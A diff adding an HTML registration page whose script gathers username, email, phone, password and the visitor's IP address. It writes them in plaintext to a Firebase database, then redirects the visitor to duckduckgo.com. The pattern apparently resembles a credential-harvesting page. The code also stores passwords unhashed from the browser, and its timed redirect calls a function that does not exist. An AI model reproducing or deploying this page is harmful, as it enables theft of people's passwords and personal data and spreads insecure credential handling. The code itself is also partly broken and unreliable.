@@ -1,1 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
 
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Register</title>
+  <style>
+    body {
+      background: #f0f0f0;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    header {
+      text-align: center;
+      padding: 1rem;
+    }
+
+    .nav-bar {
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .logo {
+      border: 2px solid;
+      border-radius: 80%;
+      height: 80px;
+    }
+
+    .name {
+      font-size: 35px;
+      text-shadow: -2px 2px 2px rgba(0, 0, 0, 0.2);
+    }
+
+    .registration-form {
+      background: white;
+      border-radius: 8px;
+      padding: 2rem;
+      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
+      margin: 0 auto;
+    }
+
+    h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      font-size: 14px;
+      margin-bottom: 5px;
+    }
+
+    input {
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    button[type="submit"] {
+      width: 100%;
+      padding: 10px;
+      background-color: lightblue;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    button[type="submit"]:hover {
+      background-color: skyblue;
+    }
+
+    .form-group:last-child {
+      margin-bottom: 0;
+    }
+  </style>
+</head>
+
+<body>
+  <header>
+    <div class="nav-bar">
+      <div class="logo-box">
+        <a href="#"><img src="/img/reglogo.png" class="logo"></a>
+      </div>
+      <div class="name">REGISTER FOR MORE</div>
+    </div>
+  </header>
+
+  <div class="registration-form">
+    <h1>Registration</h1>
+    <form id="registration-form">
+      <div class="form-group">
+        <label for="name">User Name:</label>
+        <input type="text" id="name" name="name" required>
+      </div>
+
+      <div class="form-group">
+        <label for="email">Email:</label>
+        <input type="email" id="email" name="email">
+      </div>
+
+      <div class="form-group">
+        <label for="phone">Phone Number:</label>
+        <input type="tel" id="phone" name="phone">
+      </div>
+
+      <div class="form-group">
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+      </div>
+
+      <div class="form-group">
+        <label for="confirm-password">Confirm Password:</label>
+        <input type="password" id="confirm-password" name="confirm-password" required>
+      </div>
+
+      <button type="submit">Register</button>
+    </form>
+  </div>
+
+  <footer>
+      <p>&copy; 2023. All rights reserved.</p>
+  </footer>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
+
+    const appSettings = {
+      databaseURL: "https://platground-33056-default-rtdb.firebaseio.com/"
+    };
+
+    const app = initializeApp(appSettings);
+    const database = getDatabase(app);
+
+    async function getIP() {
+      return fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => data.ip);
+    }
+
+    async function registerNewUser() {
+      const username = document.getElementById("name").value;
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      const confirmPassword = document.getElementById("confirm-password").value;
+      const phone = document.getElementById("phone").value;
+
+      if (password !== confirmPassword) {
+        alert("Passwords do not match. Please try again.");
+        return;
+      }
+
+      const ipAddress = await getIP();
+
+      const userInfo = {
+        email: email,
+        phone: phone,
+        username: username,
+        password: password,
+        ipAddress: ipAddress
+      };
+
+      const userRef = ref(database, "users/" + email.replace(/\W/g, ""));
+      await set(userRef, userInfo);
+
+      alert("Registration successful!");
+      window.location.href = "https://www.duckduckgo.com";
+
+      document.getElementById("registration-form").reset();
+    }
+
+    document.getElementById("registration-form").addEventListener("submit", function (event) {
+      event.preventDefault();
+      registerNewUser();
+    });
+  </script>
+  <script>
+    function redirectToSite() {
+      window.location.href = "https://www.duckduckgo.com";
+        }
+
+        setTimeout(redirectToGoogle, 1200000);
+    </script>
+</body>
+
+</html>
